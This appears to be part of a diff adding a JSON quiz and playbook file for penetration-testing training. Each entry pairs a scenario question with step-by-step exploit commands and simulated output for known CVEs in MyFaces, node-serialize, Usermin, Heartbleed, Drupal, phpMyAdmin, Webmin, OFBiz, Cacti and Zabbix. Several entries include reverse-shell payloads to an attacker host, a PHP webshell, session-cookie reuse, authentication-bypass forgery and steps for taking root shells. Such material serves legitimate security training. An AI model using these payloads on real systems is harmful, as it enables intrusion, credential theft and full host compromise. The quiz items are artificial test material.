+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Java deserialization gadget payload generated."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "POST the forged javax.faces.ViewState parameter to the JSF endpoint.",
+            "demo": [
+              {
+                "run": "curl -s -d 'javax.faces.ViewState={{viewstate}}' http://{{target}}:8080/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote code execution triggered via MyFaces ViewState deserialization."
+          }
+        ]
+      },
+      "situation": "Scenario: Web application uses Apache MyFaces with vulnerable JavaServer Faces ViewState handling. Which move should you run next?",
+      "choices": [
+        "myfaces-viewstate-deserialization-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Apache MyFaces ViewState Java Deserialization Remote Code Execution.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Apache MyFaces ViewState Java Deserialization Remote Code Execution.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Apache MyFaces ViewState Java Deserialization Remote Code Execution."
+      }
+    },
+    "node-serialize-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once target application uses node-serialize and parses untrusted cookies or JSON input. The key confirmation is: Exploit payload constructed for node-serialize deserialization flaw.",
+      "cmd": "python3 -c \"import base64; print(base64.b64encode(b'{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'{{command}}\\')}()\\\"}').decode())\"",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Exploit payload constructed for node-serialize deserialization flaw.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Node.js node-serialize IIFE Remote Code Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Generate a base64-encoded serialized JSON payload with IIFE syntax using the _$$ND_FUNC$$_ prefix.",
+            "demo": [
+              {
+                "run": "python3 -c \"import base64; print(base64.b64encode(b'{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'{{command}}\\')}()\\\"}').decode())\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Exploit payload constructed for node-serialize deserialization flaw."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Submit the base64-encoded cookie in an HTTP GET/POST request.",
+            "demo": [
+              {
+                "run": "curl -s -b \"profile={{cookie_payload}}\" http://{{target}}:{{port}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote command execution achieved on Node.js server via node-serialize."
+          }
+        ]
+      },
+      "situation": "Scenario: Target application uses node-serialize and parses untrusted cookies or JSON input. Which move should you run next?",
+      "choices": [
+        "node-serialize-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Node.js node-serialize IIFE Remote Code Execution.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Node.js node-serialize IIFE Remote Code Execution.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Node.js node-serialize IIFE Remote Code Execution."
+      }
+    },
+    "usermin-auth-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once reconnaissance indicates port 20000 is listening and you want to verify Usermin web presence. The key confirmation is: Usermin web portal verified active on target port 20000.",
+      "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Usermin web portal verified active on target port 20000.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Usermin Authenticated Remote Code Execution (EDB-50234 / miniserv.pl), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Request HTTPS web root on port 20000 with TLS validation disabled and filter for Usermin banner.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Usermin web portal verified active on target port 20000."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Execute EDB-50234 exploit transmitting authenticated parameter injection to miniserv.pl.",
+            "demo": [
+              {
+                "run": "python3 50234.py --rhost {{target}} --rport 20000 --user {{user}} --password '{{password}}' --lhost {{lhost}} --lport {{lport}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive shell access established as user usermin."
+          }
+        ]
+      },
+      "situation": "Scenario: Reconnaissance indicates port 20000 is listening and you want to verify Usermin web presence. Which move should you run next?",
+      "choices": [
+        "usermin-auth-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Usermin Authenticated Remote Code Execution (EDB-50234 / miniserv.pl).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Usermin Authenticated Remote Code Execution (EDB-50234 / miniserv.pl).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Usermin Authenticated Remote Code Execution (EDB-50234 / miniserv.pl)."
+      }
+    },
+    "heartbleed": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once openSSL on an older TLS service. The key confirmation is: The host is confirmed vulnerable to Heartbleed.",
+      "cmd": "nmap -p443 --script ssl-heartbleed {{target}}",
+      "tool": "nmap",
+      "output": "| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in OpenSSL",
+      "signal": "VULNERABLE",
+      "teach": "The ssl-heartbleed script confirms the host leaks memory. Dump the heartbeat repeatedly and grep each response for passwords, cookies, and tokens you can reuse.",
+      "leadup": [
+        {
+          "key": "confirm",
+          "label": "The host is confirmed vulnerable",
+          "steps": [
+            {
+              "title": "Run the heartbleed script",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p443 --script ssl-heartbleed {{target}}",
+              "out": "|   VULNERABLE:\n|   The Heartbleed Bug",
+              "sig": "VULNERABLE",
+              "teach": "No point dumping memory from a patched server; confirm first."
+            }
+          ]
+        },
+        {
+          "key": "tls",
+          "label": "A TLS service is exposed",
+          "steps": [
+            {
+              "title": "See the HTTPS port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p443 {{target}}",
+              "out": "443/tcp open  https",
+              "sig": "443/tcp open",
+              "teach": "The leak is in the TLS layer, so any OpenSSL-backed service on 443 or 8443 is a candidate."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Heartbleed is confirm the leak, dump memory in a loop, grep for secrets, then reuse them.",
+        "items": [
+          {
+            "t": "Confirm the leak",
+            "d": "The nmap script is safe and tells you whether the heartbeat over-reads memory.",
+            "demo": [
+              {
+                "run": "nmap -p443 --script ssl-heartbleed {{target}}",
+                "out": "|   VULNERABLE:",
+                "sig": "VULNERABLE"
+              }
+            ],
+            "note": "A patched OpenSSL returns nothing useful; move on if it is not vulnerable."
+          },
+          {
+            "t": "Dump memory and grep",
+            "d": "Dump the heartbeat many times and filter each response for credential-shaped strings.",
+            "demo": [
+              {
+                "run": "python2 32764.py {{target}} -p 443 -n 100 | grep -Ei 'pass|cookie|session'",
+                "out": "Cookie: PHPSESSID=8a2b1f; user=admin; pass=Spring2026!",
+                "sig": "pass=Spring2026!"
+              }
+            ],
+            "note": "The slice is random, so repeat; each dump may hold different memory."
+          },
+          {
+            "t": "Reuse what you found",
+            "d": "Take a leaked credential or session cookie to the login or app and confirm it works.",
+            "demo": [
+              {
+                "run": "curl -s -b 'PHPSESSID=8a2b1f' http://{{target}}/admin/ | grep -i welcome",
+                "out": "<h1>Welcome, admin</h1>",
+                "sig": "Welcome, admin"
+              }
+            ],
+            "note": "A leaked secret is only useful once you spend it somewhere; that is the real objective."
+          }
+        ]
+      },
+      "situation": "nmap reports the HTTPS service on 443 VULNERABLE to ssl-heartbleed. What is the move?",
+      "choices": [
+        "heartbleed",
+        "check-tls-config",
+        "recon-web-triage",
+        "sqli-basics"
+      ],
+      "coach": {
+        "check-tls-config": "TLS posture checks note weak ciphers; Heartbleed is a memory leak you actively dump, which is the move here.",
+        "recon-web-triage": "General web recon is fine, but a confirmed Heartbleed is a direct secret-harvest, so take it.",
+        "sqli-basics": "No database input is in play; the leak is in the TLS layer, not the app."
+      }
+    },
+    "drupalgeddon2": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once a Drupal site. The key confirmation is: The version is confirmed vulnerable.",
+      "cmd": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
+      "tool": "curl",
+      "output": "Drupal 7.57, 2018-02-21",
+      "signal": "Drupal 7.57",
+      "teach": "CHANGELOG.txt shows Drupal 7.57, below the 7.58 fix, so the form-render RCE applies. Run the proof of concept for a webshell.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The version is below the fix",
+          "steps": [
+            {
+              "title": "Read the CHANGELOG",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
+              "out": "Drupal 7.57, 2018-02-21",
+              "sig": "Drupal 7.57",
+              "teach": "Below 7.58 or 8.5.1 is vulnerable; anything newer is patched."
+            }
+          ]
+        },
+        {
+          "key": "fingerprint",
+          "label": "The app is Drupal",
+          "steps": [
+            {
+              "title": "Confirm the CMS",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/ | grep -i generator",
+              "out": "<meta name=\"Generator\" content=\"Drupal 7 (https://www.drupal.org)\" />",
+              "sig": "Drupal 7",
+              "teach": "The generator meta tag names Drupal; read CHANGELOG.txt next for the exact version."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Drupalgeddon2 is read the version, run the PoC for a webshell, then run commands as the web user.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "CHANGELOG.txt is world-readable on most installs and names the exact version.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
+                "out": "Drupal 7.57, 2018-02-21",
+                "sig": "Drupal 7.57"
+              }
+            ],
+            "note": "Below 7.58 or 8.5.1 is vulnerable; anything newer is patched."
+          },
+          {
+            "t": "Run the proof of concept",
+            "d": "The public PoC confirms the bug and drops an interactive webshell prompt.",
+            "demo": [
+              {
+                "run": "ruby Drupalgeddon2/drupalgeddon2.rb http://{{target}}/",
+                "out": "[+] Result : uid=33(www-data) gid=33(www-data)\ndrupalgeddon2>>",
+                "sig": "drupalgeddon2>>"
+              }
+            ],
+            "note": "The prompt runs commands on the target as the web user."
+          },
+          {
+            "t": "Run commands as the web user",
+            "d": "Confirm who you are, then upgrade to a full reverse shell for stability.",
+            "demo": [
+              {
+                "run": "drupalgeddon2>> id",
+                "out": "uid=33(www-data) gid=33(www-data)",
+                "sig": "www-data"
+              }
+            ],
+            "note": "Catch a proper reverse shell next, then enumerate for privilege escalation."
+          }
+        ]
+      },
+      "situation": "CHANGELOG.txt on a Drupal site reads Drupal 7.57. What is the move?",
+      "choices": [
+        "drupalgeddon2",
+        "wordpress",
+        "content-discovery",
+        "sqli-basics"
+      ],
+      "coach": {
+        "wordpress": "Wrong CMS; this is Drupal, and the version is below the Drupalgeddon2 fix.",
+        "content-discovery": "You already have the version from CHANGELOG; exploit it rather than keep browsing.",
+        "sqli-basics": "The bug is in form rendering, not a SQL parameter; the RCE PoC is the direct path."
+      }
+    },
+    "phpmyadmin-lfi": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once phpMyAdmin present. The key confirmation is: The version is confirmed vulnerable.",
+      "cmd": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
+      "tool": "curl",
+      "output": "Version 4.8.1",
+      "signal": "Version 4.8.1",
+      "teach": "phpMyAdmin 4.8.1 is vulnerable. Run a SELECT that contains PHP to write it into your session file, then include that file through the target parameter to execute it.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The version is 4.8.0 or 4.8.1",
+          "steps": [
+            {
+              "title": "Read the README version",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
+              "out": "Version 4.8.1",
+              "sig": "Version 4.8.1",
+              "teach": "Only 4.8.0 and 4.8.1 carry this LFI; a different version needs another way in."
+            }
+          ]
+        },
+        {
+          "key": "login",
+          "label": "You can log in to reach the SQL tab",
+          "steps": [
+            {
+              "title": "Get a session cookie",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -c cookies.txt 'http://{{target}}/phpmyadmin/index.php'",
+              "out": "Set-Cookie: phpMyAdmin=abc123; path=/",
+              "sig": "phpMyAdmin=abc123",
+              "teach": "You need a session and a working login to reach the SQL tab, the step that poisons the file."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "phpMyAdmin LFI is confirm 4.8.x, log PHP into your session file via the SQL tab, then include that file through the target parameter.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "The README names the version; only 4.8.0 and 4.8.1 are affected.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
+                "out": "Version 4.8.1",
+                "sig": "Version 4.8.1"
+              }
+            ],
+            "note": "A newer build patched the target-parameter check."
+          },
+          {
+            "t": "Poison the session file",
+            "d": "In the SQL tab, run a query whose result text is PHP; phpMyAdmin stores it in your session file on disk.",
+            "demo": [
+              {
+                "run": "SELECT '<?php system($_GET[0]); ?>'",
+                "out": "Showing rows 0 - 0 (1 total)",
+                "sig": "1 total"
+              }
+            ],
+            "note": "The query need not touch a real table; the point is to write the PHP string into the session."
+          },
+          {
+            "t": "Include the session and run a command",
+            "d": "Point the target parameter at your session file on disk and pass the command in parameter 0.",
+            "demo": [
+              {
+                "run": "curl 'http://{{target}}/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_abc123&0=id' -b 'phpMyAdmin=abc123'",
+                "out": "uid=33(www-data) gid=33(www-data)",
+                "sig": "www-data"
+              }
+            ],
+            "note": "Swap id for a reverse-shell command once the include executes."
+          }
+        ]
+      },
+      "situation": "A phpMyAdmin README reads Version 4.8.1 and you have a working login. What is the move?",
+      "choices": [
+        "phpmyadmin-lfi",
+        "sqli-basics",
+        "lfi-probe",
+        "content-discovery"
+      ],
+      "coach": {
+        "sqli-basics": "You already have database access through the panel; the win is the LFI-to-RCE chain, not blind SQLi.",
+        "lfi-probe": "The inclusion point is known (the target parameter); here you weaponise it with the session poison, not just probe for files.",
+        "content-discovery": "The panel and version are already found; exploit the known CVE."
+      }
+    },
+    "webmin-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once webmin on 10000. The key confirmation is: The Webmin version is confirmed vulnerable.",
+      "cmd": "curl -sk https://{{target}}:10000/ | grep -i webmin",
+      "tool": "curl",
+      "output": "<title>Login to Webmin</title>",
+      "signal": "Webmin",
+      "teach": "Webmin is listening on 10000. If the version is 1.890 to 1.920 with password expiry enabled, the password-reset page injects your command and runs it as root.",
+      "leadup": [
+        {
+          "key": "present",
+          "label": "Webmin is confirmed on 10000",
+          "steps": [
+            {
+              "title": "Confirm the panel",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:10000/ | grep -i webmin",
+              "out": "<title>Login to Webmin</title>",
+              "sig": "Webmin",
+              "teach": "Webmin on 10000 that banners the login page is the target; check the version next."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "Port 10000 is open",
+          "steps": [
+            {
+              "title": "See the open port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p10000 -sV {{target}}",
+              "out": "10000/tcp open  http    MiniServ 1.910 (Webmin httpd)",
+              "sig": "MiniServ 1.910",
+              "teach": "MiniServ is Webmin's server; the version here is in the 1.890 to 1.920 vulnerable range."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Webmin RCE is confirm the version on 10000, start a listener, then one request to password_change.cgi with a command in the new-password field.",
+        "items": [
+          {
+            "t": "Confirm Webmin and the version",
+            "d": "Banner the login page and read the MiniServ version; 1.890 to 1.920 is vulnerable.",
+            "demo": [
+              {
+                "run": "nmap -p10000 -sV {{target}}",
+                "out": "10000/tcp open  http    MiniServ 1.910 (Webmin httpd)",
+                "sig": "MiniServ 1.910"
+              }
+            ],
+            "note": "Newer builds removed the backdoored code, so the version is the gate."
+          },
+          {
+            "t": "Start your listener",
+            "d": "The injected command calls back, so have a listener ready first.",
+            "demo": [
+              {
+                "run": "nc -lvnp 4444",
+                "out": "listening on [any] 4444 ...",
+                "sig": "listening on"
+              }
+            ],
+            "note": "Webmin runs as root, so the connection lands as root."
+          },
+          {
+            "t": "Fire the injection",
+            "d": "Send the password-reset request with a command piped into the new-password field.",
+            "demo": [
+              {
+                "run": "curl -sk 'https://{{target}}:10000/password_change.cgi' -H 'Referer: https://{{target}}:10000/session_login.cgi' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1' --data 'user=rootxx&pam=&expired=2&old=test&new1=test&new2=test|nc {{lhost}} 4444 -e /bin/sh|'",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "The pipe in the new-password field runs nc as root; catch the shell."
+          },
+          {
+            "t": "Confirm root",
+            "d": "On the catch, confirm the identity; Webmin's privilege makes this an immediate root shell.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "You are root; capture proof and move to the flags."
+          }
+        ]
+      },
+      "situation": "Webmin answers on port 10000 and the version is MiniServ 1.910. What is the move?",
+      "choices": [
+        "webmin-rce",
+        "online-brute-rdp",
+        "content-discovery",
+        "recon-web-triage"
+      ],
+      "coach": {
+        "online-brute-rdp": "Wrong service and port; Webmin on 10000 has a direct unauthenticated RCE, no brute needed.",
+        "content-discovery": "You already know the service and version; exploit the known CVE.",
+        "recon-web-triage": "General triage is done; the version is in the vulnerable range, so take the shell."
+      }
+    },
+    "ofbiz-deser": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once apache OFBiz. The key confirmation is: The OFBiz version is confirmed vulnerable.",
+      "cmd": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
+      "tool": "curl",
+      "output": "<title>OFBiz: Web Tools</title>",
+      "signal": "OFBiz",
+      "teach": "OFBiz is present on 8443. If the version is below 17.12.04, the xmlrpc endpoint deserialises your gadget with no login. Build a CommonsBeanutils chain carrying your command and POST it.",
+      "leadup": [
+        {
+          "key": "fingerprint",
+          "label": "The app is OFBiz",
+          "steps": [
+            {
+              "title": "Banner the webtools page",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
+              "out": "<title>OFBiz: Web Tools</title>",
+              "sig": "OFBiz",
+              "teach": "The webtools page names OFBiz; the version footer tells you whether it is below 17.12.04."
+            }
+          ]
+        },
+        {
+          "key": "endpoint",
+          "label": "The xmlrpc endpoint answers",
+          "steps": [
+            {
+              "title": "Check the deserialising endpoint",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk -o /dev/null -w \"%{http_code}\\n\" https://{{target}}:8443/webtools/control/xmlrpc",
+              "out": "200",
+              "sig": "200",
+              "teach": "The vulnerable endpoint is /webtools/control/xmlrpc; a 200 means it is reachable without a login."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "OFBiz deser is confirm the version, build a ysoserial gadget with your command, then POST it to the xmlrpc endpoint.",
+        "items": [
+          {
+            "t": "Confirm the product and version",
+            "d": "The webtools page or the login footer shows the version; below 17.12.04 is vulnerable.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
+                "out": "<title>OFBiz: Web Tools</title>",
+                "sig": "OFBiz"
+              }
+            ],
+            "note": "A patched OFBiz removes the unsafe deserialisation; the version is the gate."
+          },
+          {
+            "t": "Build the gadget",
+            "d": "ysoserial produces a CommonsBeanutils chain that ends in your command.",
+            "demo": [
+              {
+                "run": "java -jar ysoserial.jar CommonsBeanutils1 'nc {{lhost}} 4444 -e /bin/sh' > payload.bin",
+                "out": "(payload.bin written)",
+                "sig": "payload.bin"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the gadget carries that command."
+          },
+          {
+            "t": "POST it to xmlrpc",
+            "d": "Wrap the gadget in the XML-RPC methodResponse and POST it to the unauthenticated endpoint.",
+            "demo": [
+              {
+                "run": "curl -sk -X POST https://{{target}}:8443/webtools/control/xmlrpc -H 'Content-Type: application/xml' --data @payload.xml",
+                "out": "(no useful body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "The endpoint deserialises the gadget and your command runs as the OFBiz user."
+          }
+        ]
+      },
+      "situation": "A Java app on 8443 banners as OFBiz, and /webtools/control/xmlrpc returns 200. What is the move?",
+      "choices": [
+        "ofbiz-deser",
+        "check-log4shell",
+        "content-discovery",
+        "sqli-basics"
+      ],
+      "coach": {
+        "check-log4shell": "Different bug; OFBiz has its own unauthenticated deserialiser on the xmlrpc endpoint.",
+        "content-discovery": "You already found the vulnerable endpoint; build and post the gadget.",
+        "sqli-basics": "No SQL parameter here; the flaw is Java deserialization, so use a gadget chain."
+      }
+    },
+    "cacti-cmdinjection": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once cacti present. The key confirmation is: The Cacti version is confirmed vulnerable.",
+      "cmd": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
+      "tool": "curl",
+      "output": "1.2.22\n\nThe following changes are in the 1.2.22 release",
+      "signal": "1.2.22",
+      "teach": "Cacti 1.2.22 is vulnerable. remote_agent.php trusts X-Forwarded-For, so spoof an authorised poller address and inject a command through the poller parameter.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The version is 1.2.22 or below",
+          "steps": [
+            {
+              "title": "Read the CHANGELOG",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
+              "out": "1.2.22",
+              "sig": "1.2.22",
+              "teach": "1.2.22 and below carry the remote_agent.php injection."
+            }
+          ]
+        },
+        {
+          "key": "endpoint",
+          "label": "remote_agent.php is reachable",
+          "steps": [
+            {
+              "title": "Check the injectable script",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://{{target}}/cacti/remote_agent.php",
+              "out": "200",
+              "sig": "200",
+              "teach": "remote_agent.php is the injectable endpoint and it answers without a login."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Cacti injection is confirm 1.2.22 or below, then fire the public script that spoofs X-Forwarded-For and injects your command.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "The CHANGELOG names the version; 1.2.22 and below are vulnerable.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
+                "out": "1.2.22",
+                "sig": "1.2.22"
+              }
+            ],
+            "note": "A newer Cacti fixed the address check."
+          },
+          {
+            "t": "Start your listener",
+            "d": "The injected command is a reverse shell, so have the listener ready.",
+            "demo": [
+              {
+                "run": "nc -lvnp 4444",
+                "out": "listening on [any] 4444 ...",
+                "sig": "listening on"
+              }
+            ],
+            "note": "The shell lands as the web user."
+          },
+          {
+            "t": "Fire the injection",
+            "d": "The public script spoofs X-Forwarded-For to an authorised poller and injects the command.",
+            "demo": [
+              {
+                "run": "python3 CVE-2022-46169.py -u http://{{target}}/cacti -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'",
+                "out": "[+] Triggering reverse shell",
+                "sig": "Triggering reverse shell"
+              }
+            ],
+            "note": "Catch the shell, then enumerate the host for privilege escalation."
+          }
+        ]
+      },
+      "situation": "Cacti's CHANGELOG shows version 1.2.22 and remote_agent.php is reachable. What is the move?",
+      "choices": [
+        "cacti-cmdinjection",
+        "command-injection",
+        "content-discovery",
+        "online-brute-ftp"
+      ],
+      "coach": {
+        "command-injection": "This is the specific remote_agent.php CVE with an X-Forwarded-For spoof precondition, not a generic app input.",
+        "content-discovery": "The endpoint and version are known; fire the exploit.",
+        "online-brute-ftp": "Wrong service entirely; the shell is through the Cacti web app."
+      }
+    },
+    "zabbix-script-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once a Zabbix frontend. The key confirmation is: The frontend and SAML are confirmed.",
+      "cmd": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
+      "tool": "curl",
+      "output": "<title>Zabbix SIA</title>",
+      "signal": "Zabbix",
+      "teach": "The Zabbix frontend is present. If SAML SSO is enabled, forge the unsigned session cookie for Admin, then use Administration Scripts to run a reverse shell on a monitored host.",
+      "leadup": [
+        {
+          "key": "frontend",
+          "label": "The Zabbix frontend is up",
+          "steps": [
+            {
+              "title": "Confirm the frontend",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
+              "out": "<title>Zabbix SIA</title>",
+              "sig": "Zabbix",
+              "teach": "The frontend is the attack surface; next check whether SSO is enabled."
+            }
+          ]
+        },
+        {
+          "key": "sso",
+          "label": "SAML SSO is enabled",
+          "steps": [
+            {
+              "title": "Look for the SSO entry point",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://{{target}}/zabbix/index_sso.php",
+              "out": "200",
+              "sig": "200",
+              "teach": "An SSO login page present means the unsigned-cookie forgery applies."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Zabbix RCE is confirm SSO, forge the Admin cookie, then add and run a Scripts entry that is a reverse shell.",
+        "items": [
+          {
+            "t": "Confirm the frontend and SSO",
+            "d": "The forgery needs SAML SSO; a present SSO login page is the precondition.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
+                "out": "<title>Zabbix SIA</title>",
+                "sig": "Zabbix"
+              }
+            ],
+            "note": "Without SSO this path does not apply; look for default credentials instead."
+          },
+          {
+            "t": "Forge the Admin session",
+            "d": "A public PoC crafts the unsigned zbx_session cookie for Admin, so the dashboard loads with no password.",
+            "demo": [
+              {
+                "run": "python3 zabbix-saml-bypass.py -u http://{{target}}/zabbix",
+                "out": "[+] Forged session for Admin",
+                "sig": "Forged session for Admin"
+              }
+            ],
+            "note": "You are now Admin in the frontend, with the Scripts feature available."
+          },
+          {
+            "t": "Run a Script on a host",
+            "d": "Administration Scripts runs OS commands on the server or agents; add one that is a reverse shell and execute it.",
+            "demo": [
+              {
+                "run": "# Administration > Scripts: new script 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1', then run it on a monitored host",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the Zabbix server or agent user."
+          }
+        ]
+      },
